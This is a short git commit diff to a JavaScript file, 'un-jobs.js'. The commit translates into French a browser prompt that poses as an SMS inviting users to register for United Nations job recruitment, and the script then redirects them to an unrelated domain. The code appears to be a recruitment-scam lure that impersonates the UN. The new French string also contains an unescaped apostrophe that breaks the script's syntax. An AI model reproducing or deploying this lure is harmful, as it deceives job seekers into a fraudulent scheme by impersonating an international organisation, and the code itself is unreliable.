30eb6f3e8e41a55efd7bea2ec05bfe47b1da94ea
boss-bloq <nsisboy01@gmail.com>
2024-07-22 15:02:50 -0700

    Update un-jobs.js

--- un-jobs.js
+++ un-jobs.js
@@ -1,6 +1,6 @@
 
 var password = '1'
-password=prompt('SMS: You are invited to register for the ongoing United Nation Job Recruitment, press 1 to start registration now ','1');
+password=prompt('SMS: Vous êtes invité à vous inscrire au recrutement en cours aux Nations Unies, appuyez sur 1 pour commencer l'inscription maintenant. ','1');
 if (password != '1') {
 location.href='https://damba-fest.org/un-recruitment.html';
 }
